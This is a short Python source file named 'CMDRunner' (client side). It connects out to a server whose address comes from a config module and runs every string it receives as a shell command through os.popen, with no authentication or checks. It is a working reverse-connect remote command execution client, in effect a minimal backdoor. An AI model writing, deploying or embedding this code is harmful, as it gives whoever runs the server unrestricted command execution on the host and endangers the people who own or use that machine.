import socket
import time
from pyfiglet import Figlet
from CONFIG import *
import os

def main():

    print('connecting..')

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    server.connect((HOST, PORT))

    print('connected')

    while True:
        data = server.recv(1024).decode()

        print('recived command: '+data)
        cmd = os.popen(data)
        time.sleep(0.01)

if __name__ == '__main__':
    print(Figlet(font='speed').renderText('CMDRunner'))
    print('CLIENT')
    main()